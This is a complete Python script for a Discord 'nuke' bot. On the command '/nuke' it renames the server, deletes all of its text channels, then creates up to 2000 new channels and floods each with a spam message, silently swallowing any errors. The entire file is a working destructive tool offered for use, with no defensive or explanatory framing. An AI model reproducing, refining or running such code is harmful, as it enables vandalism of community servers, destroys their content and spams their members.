import discord, asyncio

with open("TOKEN") as f:
    TOKEN = f.read()
with open("MESSAGE") as f:
    MESSAGE = f.read()
with open("SERVER_CHANNEL_NAME") as f:
    SERVER_CHANNEL_NAME=f.read()

intents = discord.Intents.all()
client = discord.Client(intents=intents)

async def nuke(message):
    try:
        channelIds = []
        guild = message.guild
        await guild.edit(name=SERVER_CHANNEL_NAME)
        await asyncio.gather(*(channel.delete() for channel in guild.text_channels))
        for i in range(2000):
            channel = await guild.create_text_channel(SERVER_CHANNEL_NAME)
            channelIds.append(channel.id)
            for channelId in channelIds:
                channel = client.get_channel(channelId)
                await channel.send(MESSAGE)
    except:
        pass

@client.event
async def on_ready():
    print("/nuke")

@client.event
async def on_message(message):
    if message.author.bot:
        return
    if message.content == '/nuke':
        await nuke(message)

def main():
    client.run(TOKEN)

if __name__ == "__main__":
    main()